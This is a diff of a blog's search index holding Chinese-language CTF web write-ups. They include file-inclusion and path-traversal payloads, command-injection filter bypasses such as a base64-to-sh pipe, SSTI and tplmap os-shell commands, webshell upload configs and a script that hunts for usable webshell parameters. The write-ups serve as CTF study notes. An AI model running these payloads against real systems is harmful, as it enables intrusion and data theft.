@@ -1,41 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>20210515</title>
-    <url>/posts/9d3f05e0/</url>
-    <content><![CDATA[<h2 id="BUUCTF-极客大挑战-2019-Secret-File"><a href="#BUUCTF-极客大挑战-2019-Secret-File" class="headerlink" title="BUUCTF[极客大挑战 2019]Secret File"></a>BUUCTF[极客大挑战 2019]Secret File</h2><blockquote>
-<p>主要就是文件包含和php伪协议</p>
-</blockquote>
-<p>首先观察网页，一团黑，几个字，F12，发现有个标签跟背景色一样，提示有个Archive_room.php，进去有个按钮一按就跳到了end.php，审查元素有个action.php,用bp抓包</p>
-<pre><code>&lt;html&gt;
-    &lt;!--
-    secr3t.php        
-    --&gt;
-&lt;/html&gt;
-</code></pre>
-<p>提示secr3t.php，进去是php代码，看一圈，经典文件包含</p>
-<p>构造payload:</p>
-<pre><code>?file=php://filter/read=convert.base64-encode/resource=flag.php
-</code></pre>
-<p>base64解码得到flag{66971634-57d7-4de8-a9f2-389057aa5e42}</p>
-<h2 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h2><blockquote>
-<p>代码审计</p>
-</blockquote>
-<p>F12,提示source.php,打开代码审计</p>
-<p>payload:</p>
-<pre><code>file=hint.php?/../../../../../ffffllllaaaagggg
-</code></pre>
-<p>一顿绕过之后，hint.php?/被当成目录，向上跳目录</p>
-]]></content>
-      <categories>
-        <category>ctf每日一题</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>web</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>20210516</title>
     <url>/posts/436545a/</url>
     <content><![CDATA[<h2 id="BUUCTF-ACTF2020-新生赛-Exec"><a href="#BUUCTF-ACTF2020-新生赛-Exec" class="headerlink" title="BUUCTF[ACTF2020 新生赛]Exec"></a>BUUCTF[ACTF2020 新生赛]Exec</h2><blockquote>
@@ -126,105 +91,31 @@ EXECUTE name;  //执行预定义SQL语句
       </tags>
   </entry>
   <entry>
-    <title>20210522</title>
-    <url>/posts/2876c380/</url>
-    <content><![CDATA[<h2 id="Exec"><a href="#Exec" class="headerlink" title="Exec"></a>Exec</h2><pre><code>127.0.0.1 | find / -name flag #一种查找方法
-</code></pre>
-<h2 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h2><blockquote>
-<p>http协议</p>
+    <title>20210515</title>
+    <url>/posts/9d3f05e0/</url>
+    <content><![CDATA[<h2 id="BUUCTF-极客大挑战-2019-Secret-File"><a href="#BUUCTF-极客大挑战-2019-Secret-File" class="headerlink" title="BUUCTF[极客大挑战 2019]Secret File"></a>BUUCTF[极客大挑战 2019]Secret File</h2><blockquote>
+<p>主要就是文件包含和php伪协议</p>
 </blockquote>
-<p>改代理</p>
-<pre><code>Referer:https://www.Sycsecret.com
+<p>首先观察网页，一团黑，几个字，F12，发现有个标签跟背景色一样，提示有个Archive_room.php，进去有个按钮一按就跳到了end.php，审查元素有个action.php,用bp抓包</p>
+<pre><code>&lt;html&gt;
+    &lt;!--
+    secr3t.php        
+    --&gt;
+&lt;/html&gt;
 </code></pre>
-<p>改浏览器</p>
-<pre><code>User-Agent:Syclover
+<p>提示secr3t.php，进去是php代码，看一圈，经典文件包含</p>
+<p>构造payload:</p>
+<pre><code>?file=php://filter/read=convert.base64-encode/resource=flag.php
 </code></pre>
-<p>简单XFF</p>
-<pre><code>X-Forwarded-For:127.0.0.1
-</code></pre>
-<h2 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h2><blockquote>
-<p>sql注入</p>
+<p>base64解码得到flag{66971634-57d7-4de8-a9f2-389057aa5e42}</p>
+<h2 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h2><blockquote>
+<p>代码审计</p>
 </blockquote>
-<p>扫根目录</p>
-<pre><code>? num=1;var_dump(scandir(chr(47)))
+<p>F12,提示source.php,打开代码审计</p>
+<p>payload:</p>
+<pre><code>file=hint.php?/../../../../../ffffllllaaaagggg
 </code></pre>
-<p>flag文件内容</p>
-<pre><code>? num=1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))
-</code></pre>
-<p>假如waf不允许num变量传递字母，可以在num前加个空格，这样waf就找不到num这个变量了，因为现在的变量叫“ num”，而不是“num”。但php在解析的时候，会先把空格给去掉，这样我们的代码还能正常运行，还上传了非法字符。</p>
-<p> PHP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：1.删除空白符  2.将某些字符转换为下划线</p>
-<h2 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h2><blockquote>
-<p>文件上传</p>
-</blockquote>
-<p><a href="https://www.cnblogs.com/wangtanzhi/p/12243206.html">https://www.cnblogs.com/wangtanzhi/p/12243206.html</a></p>
-]]></content>
-      <categories>
-        <category>ctf每日一题</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>web</tag>
-        <tag>sql注入</tag>
-        <tag>文件上传</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>20210519</title>
-    <url>/posts/948949cb/</url>
-    <content><![CDATA[<h2 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h2><blockquote>
-<p>远程命令执行 绕过</p>
-</blockquote>
-<p>对空格进行了过滤绕过方法：</p>
-<ul>
-<li>${IFS}替换</li>
-<li>$IFS$1替换</li>
-<li>${IFS替换</li>
-<li>%20替换</li>
-<li>&lt;和&lt;&gt;重定向符替换</li>
-<li>%09替换</li>
-</ul>
-<p>cat绕过</p>
-<pre><code>(1)more:一页一页的显示档案内容
-
-(2)less:与 more 类似，但是比 more 更好的是，他可以[pg dn][pg up]翻页
-
-(3)head:查看头几行
-
-(4)tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示
-
-(5)tail:查看尾几行
-
-(6)nl：显示的时候，顺便输出行号
-
-(7)od:以二进制的方式读取档案内容
-
-(8)vi:一种编辑器，这个也可以查看
-
-(9)vim:一种编辑器，这个也可以查看
-
-(10)sort:可以查看
-
-(11)uniq:可以查看
-
-(12)file -f:报错出具体内容
-</code></pre>
-<p>先执行</p>
-<pre><code>127.0.0.1|ls
-</code></pre>
-<p>看到有flag.php和index.php</p>
-<p>cat发现把空格过滤，这有个绕过，$IFS$1替换，又把flag给过滤了，然后看index的源码，继续绕过。</p>
-<p>1 变量拼接</p>
-<p>payload</p>
-<pre><code>?ip=1;a=g;cat$IFS$1fla$a.php
-</code></pre>
-<p>2 base64编码</p>
-<p>payload</p>
-<pre><code>?ip=1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh
-</code></pre>
-<p>3 内敛绕过</p>
-<pre><code>?ip=127.0.0.1;cat$IFS$1`ls`
-</code></pre>
-<p>将反引号里面的结果作为命令执行</p>
+<p>一顿绕过之后，hint.php?/被当成目录，向上跳目录</p>
 ]]></content>
       <categories>
         <category>ctf每日一题</category>
@@ -290,6 +181,49 @@ id=0&#39; union select 1,2,3,列名 from 表名#
         <tag>web</tag>
         <tag>sql注入</tag>
         <tag>代码审计</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>20210522</title>
+    <url>/posts/2876c380/</url>
+    <content><![CDATA[<h2 id="Exec"><a href="#Exec" class="headerlink" title="Exec"></a>Exec</h2><pre><code>127.0.0.1 | find / -name flag #一种查找方法
+</code></pre>
+<h2 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h2><blockquote>
+<p>http协议</p>
+</blockquote>
+<p>改代理</p>
+<pre><code>Referer:https://www.Sycsecret.com
+</code></pre>
+<p>改浏览器</p>
+<pre><code>User-Agent:Syclover
+</code></pre>
+<p>简单XFF</p>
+<pre><code>X-Forwarded-For:127.0.0.1
+</code></pre>
+<h2 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h2><blockquote>
+<p>sql注入</p>
+</blockquote>
+<p>扫根目录</p>
+<pre><code>? num=1;var_dump(scandir(chr(47)))
+</code></pre>
+<p>flag文件内容</p>
+<pre><code>? num=1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))
+</code></pre>
+<p>假如waf不允许num变量传递字母，可以在num前加个空格，这样waf就找不到num这个变量了，因为现在的变量叫“ num”，而不是“num”。但php在解析的时候，会先把空格给去掉，这样我们的代码还能正常运行，还上传了非法字符。</p>
+<p> PHP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：1.删除空白符  2.将某些字符转换为下划线</p>
+<h2 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h2><blockquote>
+<p>文件上传</p>
+</blockquote>
+<p><a href="https://www.cnblogs.com/wangtanzhi/p/12243206.html">https://www.cnblogs.com/wangtanzhi/p/12243206.html</a></p>
+]]></content>
+      <categories>
+        <category>ctf每日一题</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>web</tag>
+        <tag>sql注入</tag>
+        <tag>文件上传</tag>
       </tags>
   </entry>
   <entry>
@@ -372,6 +306,72 @@ findFile(path)
       </tags>
   </entry>
   <entry>
+    <title>20210519</title>
+    <url>/posts/948949cb/</url>
+    <content><![CDATA[<h2 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h2><blockquote>
+<p>远程命令执行 绕过</p>
+</blockquote>
+<p>对空格进行了过滤绕过方法：</p>
+<ul>
+<li>${IFS}替换</li>
+<li>$IFS$1替换</li>
+<li>${IFS替换</li>
+<li>%20替换</li>
+<li>&lt;和&lt;&gt;重定向符替换</li>
+<li>%09替换</li>
+</ul>
+<p>cat绕过</p>
+<pre><code>(1)more:一页一页的显示档案内容
+
+(2)less:与 more 类似，但是比 more 更好的是，他可以[pg dn][pg up]翻页
+
+(3)head:查看头几行
+
+(4)tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示
+
+(5)tail:查看尾几行
+
+(6)nl：显示的时候，顺便输出行号
+
+(7)od:以二进制的方式读取档案内容
+
+(8)vi:一种编辑器，这个也可以查看
+
+(9)vim:一种编辑器，这个也可以查看
+
+(10)sort:可以查看
+
+(11)uniq:可以查看
+
+(12)file -f:报错出具体内容
+</code></pre>
+<p>先执行</p>
+<pre><code>127.0.0.1|ls
+</code></pre>
+<p>看到有flag.php和index.php</p>
+<p>cat发现把空格过滤，这有个绕过，$IFS$1替换，又把flag给过滤了，然后看index的源码，继续绕过。</p>
+<p>1 变量拼接</p>
+<p>payload</p>
+<pre><code>?ip=1;a=g;cat$IFS$1fla$a.php
+</code></pre>
+<p>2 base64编码</p>
+<p>payload</p>
+<pre><code>?ip=1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh
+</code></pre>
+<p>3 内敛绕过</p>
+<pre><code>?ip=127.0.0.1;cat$IFS$1`ls`
+</code></pre>
+<p>将反引号里面的结果作为命令执行</p>
+]]></content>
+      <categories>
+        <category>ctf每日一题</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>web</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>20210601</title>
     <url>/posts/810f4ee1/</url>
     <content><![CDATA[<h2 id="最近几天在打比赛，断更"><a href="#最近几天在打比赛，断更" class="headerlink" title="最近几天在打比赛，断更"></a>最近几天在打比赛，断更</h2>]]></content>
@@ -404,83 +404,6 @@ findFile(path)
         <tag>ctf</tag>
         <tag>web</tag>
         <tag>代码审计</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>20210817</title>
-    <url>/posts/7be9f79f/</url>
-    <content><![CDATA[<blockquote>
-<p>都与flask有关，找机会学一下这个框架</p>
-</blockquote>
-<h2 id="Flask-FileUpload"><a href="#Flask-FileUpload" class="headerlink" title="Flask_FileUpload"></a>Flask_FileUpload</h2><p>F12审查，上传jpg后会以python文件形式将其执行，写一个py然后改后缀即可或者bp抓包改上传形式</p>
-<p>写入以下内容</p>
-<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.system(<span class="string">&quot;ls /&quot;</span>) <span class="comment">#扫描根目录</span></span><br></pre></td></tr></table></figure>
-
-<p>看回传，有个flag，直接cat就行</p>
-<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.system(<span class="string">&quot;cat /flag&quot;</span>)</span><br></pre></td></tr></table></figure>
-
-<h2 id="Simple-SSTI-1"><a href="#Simple-SSTI-1" class="headerlink" title="Simple_SSTI_1"></a>Simple_SSTI_1</h2><p>笑死了</p>
-<p><a href="https://blog.csdn.net/weixin_45950544/article/details/103847262">https://blog.csdn.net/weixin_45950544/article/details/103847262</a></p>
-<p>传入参数</p>
-<pre><code>?flag=&#123;&#123;config.SECRET_KEY&#125;&#125;
-</code></pre>
-<h2 id="Simple-SSTI-2"><a href="#Simple-SSTI-2" class="headerlink" title="Simple_SSTI_2"></a>Simple_SSTI_2</h2><p>挺有趣的一个题，用tplmap模板注入就行，还挺好用的</p>
-<pre><code>python2 tplmap.py -u url --engine=Jinja --os-shell
-</code></pre>
-<h2 id="md5碰撞"><a href="#md5碰撞" class="headerlink" title="md5碰撞"></a>md5碰撞</h2><p>感觉一般般，没给代码</p>
-<p>用的哈希0e的方法</p>
-<p>MD5碰撞</p>
-<p>PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。</p>
-<p>攻击者可以利用这一漏洞，通过输入一个经过哈希后以”0E”开头的字符串，即会被PHP解释为0，如果数据库中存在这种哈希值以”0E”开头的密码的话，他就可以以这个用户的身份登录进去，尽管并没有真正的密码。</p>
-<p>所以就令a=一个哈希后以”0E“开头的字符串即可</p>
-<p>随便试几个</p>
-<table>
-<thead>
-<tr>
-<th align="center">字符串</th>
-<th align="center">哈希值</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">QNKCDZO</td>
-<td align="center">0e830400451993494058024219903391</td>
-</tr>
-<tr>
-<td align="center">s878926199a</td>
-<td align="center">0e545993274517709034328855841020</td>
-</tr>
-<tr>
-<td align="center">s155964671a</td>
-<td align="center">0e342768416822451524974117254469</td>
-</tr>
-<tr>
-<td align="center">s214587387a</td>
-<td align="center">0e848240448830537924465865611904</td>
-</tr>
-<tr>
-<td align="center">s214587387a</td>
-<td align="center">0e848240448830537924465865611904</td>
-</tr>
-<tr>
-<td align="center">s878926199a</td>
-<td align="center">0e545993274517709034328855841020</td>
-</tr>
-<tr>
-<td align="center">s1091221200a</td>
-<td align="center">0e940624217856561557816327384675</td>
-</tr>
-<tr>
-<td align="center">s1885207154a</td>
-<td align="center">0e509367213418206700842008763514</td>
-</tr>
-</tbody></table>
-]]></content>
-      <categories>
-        <category>ctf每日一题</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>web</tag>
       </tags>
   </entry>
   <entry>
@@ -573,6 +496,83 @@ Submit
         <tag>web</tag>
         <tag>文件上传</tag>
         <tag>反序列化</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>20210817</title>
+    <url>/posts/7be9f79f/</url>
+    <content><![CDATA[<blockquote>
+<p>都与flask有关，找机会学一下这个框架</p>
+</blockquote>
+<h2 id="Flask-FileUpload"><a href="#Flask-FileUpload" class="headerlink" title="Flask_FileUpload"></a>Flask_FileUpload</h2><p>F12审查，上传jpg后会以python文件形式将其执行，写一个py然后改后缀即可或者bp抓包改上传形式</p>
+<p>写入以下内容</p>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.system(<span class="string">&quot;ls /&quot;</span>) <span class="comment">#扫描根目录</span></span><br></pre></td></tr></table></figure>
+
+<p>看回传，有个flag，直接cat就行</p>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.system(<span class="string">&quot;cat /flag&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<h2 id="Simple-SSTI-1"><a href="#Simple-SSTI-1" class="headerlink" title="Simple_SSTI_1"></a>Simple_SSTI_1</h2><p>笑死了</p>
+<p><a href="https://blog.csdn.net/weixin_45950544/article/details/103847262">https://blog.csdn.net/weixin_45950544/article/details/103847262</a></p>
+<p>传入参数</p>
+<pre><code>?flag=&#123;&#123;config.SECRET_KEY&#125;&#125;
+</code></pre>
+<h2 id="Simple-SSTI-2"><a href="#Simple-SSTI-2" class="headerlink" title="Simple_SSTI_2"></a>Simple_SSTI_2</h2><p>挺有趣的一个题，用tplmap模板注入就行，还挺好用的</p>
+<pre><code>python2 tplmap.py -u url --engine=Jinja --os-shell
+</code></pre>
+<h2 id="md5碰撞"><a href="#md5碰撞" class="headerlink" title="md5碰撞"></a>md5碰撞</h2><p>感觉一般般，没给代码</p>
+<p>用的哈希0e的方法</p>
+<p>MD5碰撞</p>
+<p>PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。</p>
+<p>攻击者可以利用这一漏洞，通过输入一个经过哈希后以”0E”开头的字符串，即会被PHP解释为0，如果数据库中存在这种哈希值以”0E”开头的密码的话，他就可以以这个用户的身份登录进去，尽管并没有真正的密码。</p>
+<p>所以就令a=一个哈希后以”0E“开头的字符串即可</p>
+<p>随便试几个</p>
+<table>
+<thead>
+<tr>
+<th align="center">字符串</th>
+<th align="center">哈希值</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">QNKCDZO</td>
+<td align="center">0e830400451993494058024219903391</td>
+</tr>
+<tr>
+<td align="center">s878926199a</td>
+<td align="center">0e545993274517709034328855841020</td>
+</tr>
+<tr>
+<td align="center">s155964671a</td>
+<td align="center">0e342768416822451524974117254469</td>
+</tr>
+<tr>
+<td align="center">s214587387a</td>
+<td align="center">0e848240448830537924465865611904</td>
+</tr>
+<tr>
+<td align="center">s214587387a</td>
+<td align="center">0e848240448830537924465865611904</td>
+</tr>
+<tr>
+<td align="center">s878926199a</td>
+<td align="center">0e545993274517709034328855841020</td>
+</tr>
+<tr>
+<td align="center">s1091221200a</td>
+<td align="center">0e940624217856561557816327384675</td>
+</tr>
+<tr>
+<td align="center">s1885207154a</td>
+<td align="center">0e509367213418206700842008763514</td>
+</tr>
+</tbody></table>
+]]></content>
+      <categories>
+        <category>ctf每日一题</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>web</tag>
       </tags>
   </entry>
   <entry>
@@ -815,8 +815,8 @@ Submit
         <tag>ctf</tag>
         <tag>web</tag>
         <tag>sql注入</tag>
-        <tag>文件上传</tag>
         <tag>代码审计</tag>
+        <tag>文件上传</tag>
       </tags>
   </entry>
   <entry>
@@ -1032,23 +1032,6 @@ Submit
       </tags>
   </entry>
   <entry>
-    <title>20211118</title>
-    <url>/posts/5c3bb6e4/</url>
-    <content><![CDATA[<h2 id="MRCTF2020-你传你🐎呢"><a href="#MRCTF2020-你传你🐎呢" class="headerlink" title="[MRCTF2020]你传你🐎呢"></a>[MRCTF2020]你传你🐎呢</h2><p>上传.htaccess </p>
-<p>上传shell.jpeg</p>
-<p>直接扫目录即可，没有过滤，非常友善</p>
-<pre><code>var_dump(file_get_contents(&#39;/flag&#39;));
-</code></pre>
-<h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><p>上传.user.ini不过是这样配置才能过</p>
-<pre><code>auto_prepend_file=shell.jpeg
-</code></pre>
-<p>以前都是</p>
-<pre><code>auto_append_file=1.txt
-</code></pre>
-<h2 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h2><p>xxe</p>
-]]></content>
-  </entry>
-  <entry>
     <title>20211117</title>
     <url>/posts/cc84ab75/</url>
     <content><![CDATA[<h2 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h2><p>先上传几个正常图片测试，jpeg能用</p>
@@ -1080,16 +1063,64 @@ var_dump(file_get_contents(&quot;/flag&quot;));
       </tags>
   </entry>
   <entry>
-    <title>58.245.43.163</title>
-    <url>/posts/b47b00b2/</url>
-    <content><![CDATA[<h1 id="这几把谁啊，真是闲的蛋疼"><a href="#这几把谁啊，真是闲的蛋疼" class="headerlink" title="这几把谁啊，真是闲的蛋疼"></a>这几把谁啊，真是闲的蛋疼</h1><p>一共访问了1700多次，合着跑字典呢</p>
-<p><img src="https://raw.githubusercontent.com/Haorical/images/master/2021/20210818114140.png?token=AQ4CEDHEUHVKVWVNHKIAYQDBDSA3A" alt="git"></p>
+    <title>20211118</title>
+    <url>/posts/5c3bb6e4/</url>
+    <content><![CDATA[<h2 id="MRCTF2020-你传你🐎呢"><a href="#MRCTF2020-你传你🐎呢" class="headerlink" title="[MRCTF2020]你传你🐎呢"></a>[MRCTF2020]你传你🐎呢</h2><p>上传.htaccess </p>
+<p>上传shell.jpeg</p>
+<p>直接扫目录即可，没有过滤，非常友善</p>
+<pre><code>var_dump(file_get_contents(&#39;/flag&#39;));
+</code></pre>
+<h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><p>上传.user.ini不过是这样配置才能过</p>
+<pre><code>auto_prepend_file=shell.jpeg
+</code></pre>
+<p>以前都是</p>
+<pre><code>auto_append_file=1.txt
+</code></pre>
+<h2 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h2><p>xxe</p>
 ]]></content>
   </entry>
   <entry>
-    <title>2021Roke</title>
-    <url>/posts/46047524/</url>
-    <content><![CDATA[]]></content>
+    <title>20211129</title>
+    <url>/posts/11d5b1/</url>
+    <content><![CDATA[<h2 id="GWCTF-2019-我有一个数据库"><a href="#GWCTF-2019-我有一个数据库" class="headerlink" title="[GWCTF 2019]我有一个数据库"></a>[GWCTF 2019]我有一个数据库</h2><blockquote>
+<p>phpmyadmin 4.8 cve 文件包含漏洞</p>
+</blockquote>
+<pre><code>?target=db_sql.php%253f/../../../../../../etc/passwd
+</code></pre>
+<h2 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h2><p>学到了请求有get改成post</p>
+<p>点击help，发现报错，把get改为post，同时改后面参数，改成post上去</p>
+<pre><code>com.wm.ctf.DownloadController.doPost(DownloadController.java:24)
+</code></pre>
+<p>得到一个奇怪的包的目录</p>
+<p>看了下wp，java项目源码在WEB-INF中，构造pyload</p>
+<p>params需要加个filename=WEB-INF/classes/com/wm/ctf/FlagController.class 同时post filename就可以把class下下来</p>
+<h2 id="强网杯-2019-高明的黑客"><a href="#强网杯-2019-高明的黑客" class="headerlink" title="[强网杯 2019]高明的黑客"></a>[强网杯 2019]高明的黑客</h2><p>把源码下下来，一共好几千个文件里面有我们需要的马，我们只需要一个一个试即可🥰</p>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">print(<span class="string">&#x27;开始时间：  &#x27;</span>+  time.asctime( time.localtime(time.time()) ))</span><br><span class="line">s1=threading.Semaphore(<span class="number">100</span>)  							  			<span class="comment">#这儿设置最大的线程数</span></span><br><span class="line">filePath = <span class="string">r&quot;C:\Users\haodo\Desktop\20211129\高明黑客\src&quot;</span></span><br><span class="line">os.chdir(filePath)													<span class="comment">#改变当前的路径</span></span><br><span class="line">requests.adapters.DEFAULT_RETRIES = <span class="number">5</span>								<span class="comment">#设置重连次数，防止线程数过高，断开连接</span></span><br><span class="line">files = os.listdir(filePath)</span><br><span class="line">session = requests.Session()</span><br><span class="line">session.keep_alive = <span class="literal">False</span>											 <span class="comment"># 设置连接活跃状态为False</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_content</span>(<span class="params">file</span>):</span></span><br><span class="line">    s1.acquire()												</span><br><span class="line">    print(<span class="string">&#x27;trying   &#x27;</span>+file+ <span class="string">&#x27;     &#x27;</span>+ time.asctime( time.localtime(time.time()) ))</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:							<span class="comment">#打开php文件，提取所有的$_GET和$_POST的参数</span></span><br><span class="line">            gets = <span class="built_in">list</span>(re.findall(<span class="string">&#x27;\$_GET\[\&#x27;(.*?)\&#x27;\]&#x27;</span>, f.read()))</span><br><span class="line">            posts = <span class="built_in">list</span>(re.findall(<span class="string">&#x27;\$_POST\[\&#x27;(.*?)\&#x27;\]&#x27;</span>, f.read()))</span><br><span class="line">    data = &#123;&#125;														<span class="comment">#所有的$_POST</span></span><br><span class="line">    params = &#123;&#125;														<span class="comment">#所有的$_GET</span></span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> gets:</span><br><span class="line">        params[m] = <span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> posts:</span><br><span class="line">        data[n] = <span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span></span><br><span class="line">    url = <span class="string">&#x27;http://fab0ef41-82a7-480e-a354-be549de9731f.node4.buuoj.cn:81/&#x27;</span>+file</span><br><span class="line">    req = session.post(url, data=data, params=params)			<span class="comment">#一次性请求所有的GET和POST</span></span><br><span class="line">    req.close()												<span class="comment"># 关闭请求  释放内存</span></span><br><span class="line">    req.encoding = <span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line">    content = req.text</span><br><span class="line">    <span class="comment">#print(content)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;xxxxxx&quot;</span> <span class="keyword">in</span> content:									<span class="comment">#如果发现有可以利用的参数，继续筛选出具体的参数</span></span><br><span class="line">        flag = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> a <span class="keyword">in</span> gets:</span><br><span class="line">            req = session.get(url+<span class="string">&#x27;?%s=&#x27;</span>%a+<span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span>)</span><br><span class="line">            content = req.text</span><br><span class="line">            req.close()												<span class="comment"># 关闭请求  释放内存</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;xxxxxx&quot;</span> <span class="keyword">in</span> content:</span><br><span class="line">                flag = <span class="number">1</span></span><br><span class="line">                exit(<span class="number">1</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag != <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">for</span> b <span class="keyword">in</span> posts:</span><br><span class="line">                req = session.post(url, data=&#123;b:<span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span>&#125;)</span><br><span class="line">                content = req.text</span><br><span class="line">                req.close()												<span class="comment"># 关闭请求  释放内存</span></span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;xxxxxx&quot;</span> <span class="keyword">in</span> content:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag == <span class="number">1</span>:													<span class="comment">#flag用来判断参数是GET还是POST，如果是GET，flag==1，则b未定义；如果是POST，flag为0，</span></span><br><span class="line">            param = a</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            param = b</span><br><span class="line">        print(<span class="string">&#x27;找到了利用文件： &#x27;</span>+file+<span class="string">&quot;  and 找到了利用的参数：%s&quot;</span> %param)</span><br><span class="line">        print(<span class="string">&#x27;结束时间：  &#x27;</span> + time.asctime(time.localtime(time.time())))</span><br><span class="line">    s1.release()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> files:															<span class="comment">#加入多线程</span></span><br><span class="line">   t = threading.Thread(target=get_content, args=(i,))</span><br><span class="line">   t.start()</span><br></pre></td></tr></table></figure>
+<p>需要先本地测试，找到马后直接服务器利用即可</p>
